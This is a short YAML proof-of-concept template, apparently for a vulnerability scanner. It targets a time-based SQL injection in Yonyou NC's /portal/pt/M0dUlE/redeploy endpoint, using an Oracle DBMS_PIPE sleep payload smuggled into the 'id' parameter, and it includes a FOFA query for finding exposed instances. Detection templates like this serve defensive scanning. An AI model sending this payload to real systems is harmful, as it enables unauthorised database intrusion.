id: poc-yaml-yongyou-nc-m0dule-sqli
info:
  name: 用友NC M0dUlE SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(1,4)
  t2: t1 * 3
  t3: t2 + 2
requests:
- method: GET
  path: /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,{{.t1}})--&pageId=login
  expression: status_code == 200 && contains(body,"CRC") && contains(body,"ERRORredeploy")
    && contains(body,"ok!") && duration > t2 && duration < t3
transport: http
